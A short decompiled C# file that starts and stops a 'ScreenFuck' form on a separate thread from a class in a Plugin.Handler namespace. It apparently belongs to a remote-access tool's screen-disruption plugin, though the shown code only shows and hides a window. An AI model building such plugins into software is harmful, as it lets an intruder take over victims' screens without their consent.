using System.Threading;
using System.Windows.Forms;
using ScreenFuck;

namespace Plugin.Handler;

internal class HandleFuckScreen
{
	private static Form1 Form1;

	public static void Start()
	{
		if (Form1 == null)
		{
			new Thread((ThreadStart)delegate
			{
				//IL_000f: Unknown result type (might be due to invalid IL or missing references)
				Form1 = new Form1();
				((Form)Form1).ShowDialog();
			}).Start();
		}
	}

	public static void Stop()
	{
		if (Form1 != null)
		{
			Form1.Stop();
			Form1 = null;
		}
	}
}
